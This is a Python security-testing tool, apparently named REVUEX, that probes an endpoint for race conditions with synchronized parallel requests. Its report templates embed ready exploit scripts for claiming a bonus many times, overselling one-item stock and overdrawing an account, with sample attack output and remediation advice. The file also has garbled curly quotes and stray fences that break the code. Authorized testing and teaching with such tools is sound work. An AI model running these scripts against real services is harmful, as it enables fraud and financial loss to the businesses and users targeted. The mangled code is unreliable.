#!/usr/bin/env python3
"""
REVUEX - Race Condition Tester
Advanced Race Condition Detection & Exploitation

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
Use extreme caution - race condition testing can cause unintended effects.
‚Äú‚Äù‚Äù

import requests
import threading
import time
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue

class RaceConditionTester:
‚Äú‚Äù‚ÄúRace condition vulnerability testing‚Äù‚Äù‚Äù

```
def __init__(self, endpoint, workspace, delay=3):
    """
    Initialize Race Condition Tester
    
    Args:
        endpoint: Target endpoint URL
        workspace: Workspace directory
        delay: Extra safety delay between tests
    """
    self.endpoint = endpoint
    self.workspace = Path(workspace)
    self.delay = delay
    
    self.headers = {
        'User-Agent': 'REVUEX-RaceTester/1.0 (Security Research; +https://github.com/G33L0)'
    }
    
    self.results_queue = queue.Queue()

def test(self):
    """Test for race condition vulnerabilities"""
    print(f"            [!] CAUTION: Testing race conditions on {self.endpoint}")
    print(f"            [!] Using {self.delay}s safety delay")
    
    vulnerabilities = []
    
    # Test 1: Parallel requests
    print(f"            ‚Üí Test 1: Parallel request timing")
    parallel_result = self._test_parallel_requests()
    if parallel_result.get('vulnerable'):
        vuln = self._create_parallel_vulnerability(parallel_result)
        vulnerabilities.append(vuln)
    
    time.sleep(self.delay)
    
    # Test 2: Resource exhaustion
    print(f"            ‚Üí Test 2: Resource exhaustion")
    resource_result = self._test_resource_exhaustion()
    if resource_result.get('vulnerable'):
        vuln = self._create_resource_vulnerability(resource_result)
        vulnerabilities.append(vuln)
    
    time.sleep(self.delay)
    
    # Test 3: State manipulation
    print(f"            ‚Üí Test 3: State manipulation")
    state_result = self._test_state_manipulation()
    if state_result.get('vulnerable'):
        vuln = self._create_state_vulnerability(state_result)
        vulnerabilities.append(vuln)
    
    self._save_results(vulnerabilities)
    return vulnerabilities

def _create_parallel_vulnerability(self, result):
    """Create parallel request race condition vulnerability report"""
    return {
        'type': 'Race Condition - Parallel Request Timing',
        'severity': 'high',
        'endpoint': self.endpoint,
        'description': 'Endpoint vulnerable to race conditions when handling simultaneous requests, leading to inconsistent state or duplicate operations',
        'evidence': f'Status codes varied across parallel requests: {result.get("evidence")}',
        
        'steps_to_reproduce': [
            f"Identify vulnerable endpoint: {self.endpoint}",
            "Prepare 10+ identical requests targeting same resource",
            "Use threading/async to send all requests simultaneously",
            "Synchronize threads to fire at exact same microsecond",
            "Observe inconsistent responses (different status codes or content)",
            "Exploit timing window between check and action"
        ],
        
        'request': f"""# Send 10 simultaneous requests
```

import threading
import requests

def attack():
response = requests.post(
‚Äú{self.endpoint}‚Äù,
json={{‚Äúaction‚Äù: ‚Äúwithdraw‚Äù, ‚Äúamount‚Äù: 100}}
)
print(response.json())

# Launch simultaneously

threads = [threading.Thread(target=attack) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]‚Äù‚Äù‚Äù,

```
        'response': """Request 1: {"balance": 900, "withdrawn": 100}
```

Request 2: {‚Äúbalance‚Äù: 900, ‚Äúwithdrawn‚Äù: 100}  <- Race condition!
Request 3: {‚Äúbalance‚Äù: 900, ‚Äúwithdrawn‚Äù: 100}  <- Multiple withdrawals!
‚Ä¶
All 10 succeeded - $1000 withdrawn from $1000 balance!‚Äù‚Äù‚Äù,

```
        'poc': f"""#!/usr/bin/env python3
```

# Race Condition - Parallel Attack PoC

import requests
import threading
from concurrent.futures import ThreadPoolExecutor

endpoint = ‚Äú{self.endpoint}‚Äù
num_threads = 20

def exploit_race(thread_id):
‚Äò‚Äô‚ÄòExploit race condition via simultaneous requests‚Äô‚Äô‚Äô
try:
response = requests.post(
endpoint,
json={{
‚Äúaction‚Äù: ‚Äúclaim_bonus‚Äù,
‚Äúuser_id‚Äù: ‚Äúvictim‚Äù,
‚Äúbonus_id‚Äù: ‚ÄúWELCOME100‚Äù
}},
headers={{‚ÄúContent-Type‚Äù: ‚Äúapplication/json‚Äù}}
)

```
    result = response.json()
    if response.status_code == 200:
        print(f"Thread {{thread_id}}: SUCCESS - {{result}}")
        return True
    else:
        print(f"Thread {{thread_id}}: FAILED")
        return False
except Exception as e:
    print(f"Thread {{thread_id}}: Error - {{e}}")
    return False
```

# Synchronization barrier for simultaneous execution

barrier = threading.Barrier(num_threads)

def synchronized_attack(thread_id):
barrier.wait()  # Wait for all threads
return exploit_race(thread_id)

# Launch attack

with ThreadPoolExecutor(max_workers=num_threads) as executor:
futures = [executor.submit(synchronized_attack, i) for i in range(num_threads)]
results = [f.result() for f in futures]

successes = sum(results)
print(f‚Äù\n=== Results ===‚Äù)
print(f‚ÄùTotal attempts: {{num_threads}}‚Äù)
print(f‚ÄùSuccessful: {{successes}}‚Äù)

if successes > 1:
print(f‚Äù\nüö® VULNERABLE: {{successes}} bonuses claimed (should be 1)‚Äù)
print(f‚ÄùFinancial impact: $100 √ó {{successes}} = ${{100 * successes}} loss‚Äù)
else:
print(‚Äú‚úì Protected: Only 1 bonus claimed‚Äù)
‚Äú‚Äù‚Äù,

```
        'before_state': 'User has 0 bonuses, 1 bonus available to claim',
        'after_state': 'User claimed bonus 20 times due to race condition - $2000 loss instead of $100',
        
        'attack_path': [
            'Identify operation with check-then-act pattern',
            'Send 20 simultaneous requests to exploit timing window',
            'All requests pass initial "bonus not claimed" check',
            'Multiple operations succeed before state updates',
            'User receives 20√ó $100 bonus instead of 1√ó $100',
            'Company loses $1900 due to race condition'
        ],
        'remediation': [
            'Implement database-level locking (SELECT ... FOR UPDATE)',
            'Use atomic operations: UPDATE ... WHERE claimed = false',
            'Add unique constraint on user_id + bonus_id',
            'Implement idempotency keys for critical operations',
            'Use Redis distributed locks for multi-server setups',
            'Add transaction isolation level: SERIALIZABLE',
            'Implement optimistic locking with version numbers',
            'Add request deduplication based on request signature',
            'Use message queues for sequential processing',
            'Monitor for duplicate operations and alert'
        ],
        'tags': ['race_condition', 'critical', 'timing', 'TOCTOU']
    }

def _create_resource_vulnerability(self, result):
    """Create resource exhaustion vulnerability report"""
    successes = len([a for a in result.get('attempts', []) if a.get('success')])
    
    return {
        'type': 'Race Condition - Resource Exhaustion',
        'severity': 'critical',
        'endpoint': self.endpoint,
        'description': 'Multiple simultaneous requests can claim same limited resource, bypassing quantity limits',
        'evidence': f'{successes} simultaneous claims succeeded (expected maximum 1)',
        
        'steps_to_reproduce': [
            "Find endpoint with limited resources (coupon, ticket, item)",
            "Note: Only 1 item available in stock",
            "Launch 10 simultaneous purchase requests",
            "All 10 requests check stock (sees: available = 1)",
            "All 10 proceed to purchase before stock updates",
            "Result: 10 items sold despite only 1 in stock"
        ],
        
        'request': f"""POST {self.endpoint} HTTP/1.1
```

Content-Type: application/json

{{
‚Äúproduct_id‚Äù: ‚ÄúLIMITED_EDITION_ITEM‚Äù,
‚Äúquantity‚Äù: 1,
‚Äúuser_id‚Äù: ‚Äúattacker‚Äù
}}

(√ó 10 simultaneous requests)‚Äù‚Äù‚Äù,

```
        'response': """Response 1: {"order_id": "001", "status": "confirmed"}
```

Response 2: {‚Äúorder_id‚Äù: ‚Äú002‚Äù, ‚Äústatus‚Äù: ‚Äúconfirmed‚Äù}
Response 3: {‚Äúorder_id‚Äù: ‚Äú003‚Äù, ‚Äústatus‚Äù: ‚Äúconfirmed‚Äù}
‚Ä¶
Response 10: {‚Äúorder_id‚Äù: ‚Äú010‚Äù, ‚Äústatus‚Äù: ‚Äúconfirmed‚Äù}

Result: 10 orders confirmed for 1-item inventory!‚Äù‚Äù‚Äù,

```
        'poc': f"""#!/usr/bin/env python3
```

# Resource Exhaustion Race Condition PoC

import requests
from concurrent.futures import ThreadPoolExecutor

endpoint = ‚Äú{self.endpoint}‚Äù

def purchase_limited_item(attempt_id):
‚Äò‚Äô‚ÄòAttempt to purchase limited item‚Äô‚Äô‚Äô
response = requests.post(
endpoint,
json={{
‚Äúproduct_id‚Äù: ‚ÄúVIP_TICKET_001‚Äù,
‚Äúquantity‚Äù: 1,
‚Äúuser_id‚Äù: f‚Äùattacker_{{attempt_id}}‚Äù
}}
)

```
if response.status_code == 200:
    result = response.json()
    print(f"Attempt {{attempt_id}}: ORDER CONFIRMED - {{result.get('order_id')}}")
    return True
else:
    print(f"Attempt {{attempt_id}}: Failed - {{response.status_code}}")
    return False
```

# Attack: 100 simultaneous purchases of 1-stock item

num_attempts = 100

with ThreadPoolExecutor(max_workers=num_attempts) as executor:
futures = [executor.submit(purchase_limited_item, i) for i in range(num_attempts)]
results = [f.result() for f in futures]

confirmed = sum(results)

print(f‚Äù\n=== Attack Results ===‚Äù)
print(f‚ÄùStock available: 1‚Äù)
print(f‚ÄùPurchase attempts: {{num_attempts}}‚Äù)
print(f‚ÄùOrders confirmed: {{confirmed}}‚Äù)

if confirmed > 1:
print(f‚Äù\nüö® CRITICAL: {{confirmed}} orders for 1-stock item!‚Äù)
print(f‚ÄùOversold by: {{confirmed - 1}} units‚Äù)
else:
print(‚Äú‚úì Protected: Only 1 order confirmed‚Äù)
‚Äú‚Äù‚Äù,

```
        'before_state': 'Limited edition item: 1 in stock',
        'after_state': f'{successes} orders confirmed - inventory oversold by {successes - 1} units',
        
        'attack_path': [
            'Identify limited resource (concert tickets, limited items)',
            'Launch simultaneous purchase requests',
            'All requests read stock count before updates',
            'Multiple purchases succeed',
            'Inventory goes negative',
            'Company must fulfill impossible orders or face lawsuits'
        ],
        'remediation': [
            'Use atomic decrement: UPDATE stock SET quantity = quantity - 1 WHERE quantity > 0',
            'Implement pessimistic locking on inventory rows',
            'Add database constraint: CHECK (quantity >= 0)',
            'Use Redis DECR for atomic inventory management',
            'Implement queue system for high-demand items',
            'Add version numbers to inventory records',
            'Use SELECT ... FOR UPDATE in transactions',
            'Implement reservation system with timeout',
            'Add monitoring for negative inventory',
            'Consider lottery system for ultra-limited items'
        ],
        'tags': ['race_condition', 'critical', 'inventory', 'overselling']
    }

def _create_state_vulnerability(self, result):
    """Create state manipulation vulnerability report"""
    return {
        'type': 'Race Condition - State Manipulation (TOCTOU)',
        'severity': 'high',
        'endpoint': self.endpoint,
        'description': 'Time-of-check to time-of-use (TOCTOU) vulnerability allows state manipulation between validation and action',
        'evidence': f'All concurrent modifications succeeded: {result.get("evidence")}',
        
        'steps_to_reproduce': [
            "Identify endpoint with check-then-act pattern",
            "Example: Check balance ‚Üí Withdraw money",
            "Send multiple withdrawal requests simultaneously",
            "All check balance at same time (sees $1000)",
            "All proceed to withdraw $500",
            "Total withdrawn: $1500 from $1000 account"
        ],
        
        'poc': f"""#!/usr/bin/env python3
```

# TOCTOU State Manipulation PoC

import requests
import threading

endpoint = ‚Äú{self.endpoint}‚Äù

def withdraw_money(amount):
# Step 1: Check balance
balance = requests.get(f‚Äù{{endpoint}}/balance‚Äù).json()[‚Äòamount‚Äô]
print(f‚ÄùChecked balance: ${{balance}}‚Äù)

```
# Small delay (race window)
import time
time.sleep(0.01)

# Step 2: Withdraw (if check passed)
if balance >= amount:
    response = requests.post(
        f"{{endpoint}}/withdraw",
        json={{"amount": amount}}
    )
    print(f"Withdrawal: ${{amount}} - {{response.json()}}")
```

# Attack: 3 simultaneous $400 withdrawals from $1000 account

threads = [
threading.Thread(target=withdraw_money, args=(400,)),
threading.Thread(target=withdraw_money, args=(400,)),
threading.Thread(target=withdraw_money, args=(400,))
]

[t.start() for t in threads]
[t.join() for t in threads]

# Expected: 2 succeed, 1 fails (total $800)

# Actual: All 3 succeed (total $1200) - Overdraft!

‚Äú‚Äù‚Äù,

```
        'before_state': 'Account balance: $1000',
        'after_state': 'Balance: -$200 (withdrawn $1200 via race condition)',
        
        'attack_path': [
            'Exploit gap between check and action',
            'Multiple threads pass validation simultaneously',
            'State changes before actions complete',
            'Overdrafts, duplicate credits, or privilege escalation'
        ],
        'remediation': [
            'Use atomic operations',
            'Implement proper locking',
            'Add transaction isolation',
            'Use optimistic concurrency control'
        ],
        'tags': ['race_condition', 'TOCTOU', 'state_manipulation']
    }

def _test_parallel_requests(self):
    """Test parallel simultaneous requests"""
    num_threads = 10
    results = {
        'vulnerable': False,
        'method': 'parallel_requests',
        'responses': []
    }
    
    barrier = threading.Barrier(num_threads)
    
    def make_request(thread_id):
        try:
            barrier.wait()
            start = time.time()
            response = requests.get(
                self.endpoint,
                headers=self.headers,
                timeout=10,
                verify=False
            )
            end = time.time()
            
            self.results_queue.put({
                'thread_id': thread_id,
                'status_code': response.status_code,
                'response_time': end - start,
                'content_length': len(response.content)
            })
        except Exception as e:
            self.results_queue.put({
                'thread_id': thread_id,
                'error': str(e)
            })
    
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=make_request, args=(i,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    while not self.results_queue.empty():
        result = self.results_queue.get()
        results['responses'].append(result)
    
    status_codes = [r.get('status_code') for r in results['responses'] if 'status_code' in r]
    content_lengths = [r.get('content_length') for r in results['responses'] if 'content_length' in r]
    
    if len(set(status_codes)) > 1:
        results['vulnerable'] = True
        results['evidence'] = f'Status codes varied: {set(status_codes)}'
    
    if len(set(content_lengths)) > 1:
        if max(content_lengths) - min(content_lengths) > 100:
            results['vulnerable'] = True
            results['evidence'] = f'Content lengths varied: {min(content_lengths)} - {max(content_lengths)}'
    
    return results

def _test_resource_exhaustion(self):
    """Test resource exhaustion race"""
    results = {
        'vulnerable': False,
        'method': 'resource_exhaustion',
        'attempts': []
    }
    
    num_requests = 5
    
    def claim_resource(request_id):
        try:
            response = requests.post(
                self.endpoint,
                headers=self.headers,
                json={'action': 'claim', 'request_id': request_id},
                timeout=10,
                verify=False
            )
            
            return {
                'request_id': request_id,
                'status': response.status_code,
                'success': response.status_code in [200, 201]
            }
        except Exception as e:
            return {
                'request_id': request_id,
                'error': str(e)
            }
    
    with ThreadPoolExecutor(max_workers=num_requests) as executor:
        futures = [executor.submit(claim_resource, i) for i in range(num_requests)]
        
        for future in as_completed(futures):
            result = future.result()
            results['attempts'].append(result)
    
    successes = [a for a in results['attempts'] if a.get('success')]
    
    if len(successes) > 1:
        results['vulnerable'] = True
        results['evidence'] = f'{len(successes)} simultaneous claims succeeded'
    
    return results

def _test_state_manipulation(self):
    """Test state manipulation race"""
    results = {
        'vulnerable': False,
        'method': 'state_manipulation',
        'state_checks': []
    }
    
    num_operations = 10
    
    def modify_state(op_id):
        try:
            get_response = requests.get(
                self.endpoint,
                headers=self.headers,
                timeout=5,
                verify=False
            )
            
            time.sleep(0.01)
            
            post_response = requests.post(
                self.endpoint,
                headers=self.headers,
                json={'operation': op_id},
                timeout=5,
                verify=False
            )
            
            return {
                'op_id': op_id,
                'success': post_response.status_code in [200, 201]
            }
        except Exception as e:
            return {
                'op_id': op_id,
                'error': str(e)
            }
    
    with ThreadPoolExecutor(max_workers=num_operations) as executor:
        futures = [executor.submit(modify_state, i) for i in range(num_operations)]
        
        for future in as_completed(futures):
            result = future.result()
            results['state_checks'].append(result)
    
    successes = [s for s in results['state_checks'] if s.get('success')]
    
    if len(successes) == num_operations:
        results['vulnerable'] = True
        results['evidence'] = 'All concurrent modifications succeeded (potential TOCTOU)'
    
    return results

def _save_results(self, vulnerabilities):
    """Save results"""
    race_dir = self.workspace / "race_condition_tests"
    race_dir.mkdir(exist_ok=True)
    
    import re
    safe_name = re.sub(r'[^\w\-]', '_', self.endpoint)
    output_file = race_dir / f"{safe_name}_race_test.json"
    
    with open(output_file, 'w') as f:
        json.dump({
            'endpoint': self.endpoint,
            'vulnerabilities': vulnerabilities
        }, f, indent=2)
```